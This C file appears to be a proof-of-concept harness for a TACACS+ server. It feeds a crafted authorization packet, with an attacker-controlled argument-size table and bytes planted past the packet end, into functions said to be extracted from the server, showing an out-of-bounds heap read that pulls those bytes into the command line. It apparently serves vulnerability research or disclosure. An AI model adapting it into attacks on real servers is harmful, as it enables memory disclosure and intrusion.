/* Minimal stubs around functions extracted verbatim from the pinned blobs.
   Only struct/macros, allocation stubs and the driver are local. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

typedef unsigned char u_char;
typedef unsigned int u_int;

#define TAC_PLUS_HDR_SIZE 12
#define tac_payload(A, B) ((B) ((u_char *) (A) + TAC_PLUS_HDR_SIZE))
#define CLIENT_BUG_HEADER_LENGTH 0x08
#define TAC_AUTHOR_REQ_FIXED_FIELDS_SIZE 8
#define TAC_ACCT_REQ_FIXED_FIELDS_SIZE 8

typedef struct { char *txt; size_t len; } str_t;
static str_t *str_set(str_t *str, char *txt, size_t len)
{
    str->txt = txt;
    str->len = len ? len : (txt ? strlen(txt) : 0);
    return str;
}

typedef struct { int unused; } mem_t;
struct tac_pak_hdr {
    u_char version, type, seq_no, flags;
    u_int session_id;
    u_int datalength;
};
struct author {
    u_char method, priv, authen_type, service;
    u_char user_len, port_len, rem_addr_len, arg_cnt;
};
struct acct {
    u_char method, priv, authen_type, service;
    u_char user_len, port_len, rem_addr_len, arg_cnt;
};
struct in_struct {
    struct { struct tac_pak_hdr tac; } pak;
    u_int length;
};
struct host_struct { int bug_compatibility; };
struct context {
    struct in_struct *in;
    struct host_struct *host;
    mem_t *mem;
};
struct tac_session {
    struct context *ctx;
    mem_t *mem;
    str_t service, protocol, cmdline;
};
typedef struct tac_pak_hdr tac_pak_hdr;
typedef struct tac_session tac_session;

static char *mem_strdup(mem_t *m, char *s)
{
    (void) m;
    return strdup(s);
}
static char *mem_strndup(mem_t *m, u_char *s, size_t len)
{
    (void) m;
    char *p = malloc(len + 1);
    memcpy(p, s, len);
    p[len] = 0;
    return p;
}

#include "fn.inc"

int main(int argc, char **argv)
{
    int t1 = argc > 1 ? atoi(argv[1]) : 12;
    int fill = argc > 2 ? (int) strtol(argv[2], NULL, 0) : 'Z';
    u_char table[3] = { 4, (u_char) t1, 0 };
    const char *data = "cmd=";
    u_int datalength = 8 + 3 + 4;

    u_char *buf = calloc(1, TAC_PLUS_HDR_SIZE + 323);
    struct tac_pak_hdr *hdr = (struct tac_pak_hdr *) buf;
    hdr->datalength = htonl(datalength);
    u_char *body = buf + TAC_PLUS_HDR_SIZE;
    body[0] = 6; body[1] = 1; body[2] = 1; body[3] = 1;
    body[4] = 0; body[5] = 0; body[6] = 0; body[7] = 3;
    memcpy(body + 8, table, 3);
    memcpy(body + 11, data, 4);

    /* Attacker-arranged heap bytes immediately past the accepted packet. */
    u_char *beyond = body + datalength;
    memcpy(beyond, "cmd=", 4);
    memset(beyond + 4, fill, 40);

    struct in_struct *in = (struct in_struct *) buf;
    in->length = datalength;
    struct host_struct host = { 0 };
    struct context ctx = { in, &host, NULL };
    struct tac_session sess;
    memset(&sess, 0, sizeof sess);
    sess.ctx = &ctx;
    (void) hdr;

    int bogus = author_pak_looks_bogus(&ctx);
    printf("datalength=%u arg_cnt=3 size_table=4,%d,0 validator_bogus=%d\n",
           datalength, t1, bogus);
    if (!bogus)
        eval_args(&sess, body + 8 + 3, body + 8, 3);
    printf("cmdline_len=%zu cmdline=", sess.cmdline.len);
    if (sess.cmdline.txt)
        fwrite(sess.cmdline.txt, 1, sess.cmdline.len, stdout);
    printf("\n");
    return 0;
}
